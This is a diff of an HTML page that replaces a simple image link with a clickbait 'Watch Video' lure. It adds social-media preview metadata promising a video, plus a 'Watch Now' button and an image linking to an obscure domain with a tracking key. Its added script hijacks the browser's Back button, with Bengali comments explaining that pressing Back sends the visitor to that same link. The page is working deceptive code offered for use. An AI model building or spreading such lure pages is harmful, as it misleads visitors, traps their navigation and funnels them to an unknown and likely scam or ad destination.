@@ -1,12 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Clickable Image Redirect</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Watch Video</title>
+  <meta name="title" content="Watch Video" />
+  <meta name="description" content="Click to watch the video now!" />
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://genderorganiccensus.com/fbihd572ye?key=b95314702737d47bb511a574e16c5ba6" />
+  <meta property="og:title" content="Watch Video" />
+  <meta property="og:description" content="Click to watch the video now!" />
+  <meta property="og:image" content="https://files.catbox.moe/o9a1bz.jpg" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" content="https://genderorganiccensus.com/fbihd572ye?key=b95314702737d47bb511a574e16c5ba6" />
+  <meta name="twitter:title" content="Watch Video" />
+  <meta name="twitter:description" content="Click to watch the video now!" />
+  <meta name="twitter:image" content="https://files.catbox.moe/o9a1bz.jpg" />
+
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    img:hover {
+      transform: scale(1.05);
+    }
+    .button {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #ff0000;
+      color: #fff;
+      text-decoration: none;
+      font-size: 18px;
+      border-radius: 5px;
+    }
+    .button:hover {
+      background: #cc0000;
+    }
+  </style>
+
+  <script>
+    // ব্যাক বাটন হ্যান্ডেল করা
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      // ইউজার ব্যাক চাপলে তোমার লিঙ্কে রিডাইরেক্ট হবে
+      window.location.href = "https://genderorganiccensus.com/fbihd572ye?key=b95314702737d47bb511a574e16c5ba6";
+    };
+  </script>
+
 </head>
-<body style="text-align:center; margin-top: 50px;">
-  <a href="https://yacinetv6.blogspot.com" target="_blank">
-    <img src="https://files.catbox.moe/tsu7ue.jpg" alt="Click Me" style="width:90%; max-width:400px; border-radius:10px;">
-  </a>
+<body>
+  <div class="container">
+    <a href="https://genderorganiccensus.com/fbihd572ye?key=b95314702737d47bb511a574e16c5ba6" target="_blank">
+      <img src="https://files.catbox.moe/7jy0b0.jpg" alt="Watch Video" />
+    </a>
+    <br />
+    <a href="https://genderorganiccensus.com/fbihd572ye?key=b95314702737d47bb511a574e16c5ba6" class="button" target="_blank">
+      Watch Now
+    </a>
+  </div>
 </body>
 </html>
